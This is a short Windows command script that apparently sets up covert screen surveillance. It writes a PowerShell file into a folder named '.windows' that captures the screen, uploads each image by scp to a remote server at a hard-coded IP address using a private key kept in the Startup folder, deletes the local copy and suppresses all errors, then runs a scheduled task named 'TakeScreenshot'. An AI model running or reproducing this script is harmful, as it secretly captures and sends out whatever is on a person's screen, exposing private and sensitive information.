powershell -NoProfile -Command "if (!(Test-Path '%USERPROFILE%\.windows')) { New-Item -ItemType Directory -Path '%USERPROFILE%\.windows' | Out-Null }; Set-Content -Path '%USERPROFILE%\.windows\screenshot.ps1' -Value 'try { Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $ts = Get-Date -Format \"yyyy-MM-dd_HH-mm-ss\"; $file = \"$env:USERPROFILE\Pictures\screen_$ts.png\"; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save($file); $g.Dispose(); $bmp.Dispose(); if (Test-Path $file) { scp -v -i \"C:\Users\dominik\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\id_rsa_server\" $file ubuntu@193.123.189.154:/home/ubuntu/.ssh/screenshots/ 2>&1; if ($?) { Remove-Item $file } } } catch { }'"

schtasks /run /tn "TakeScreenshot"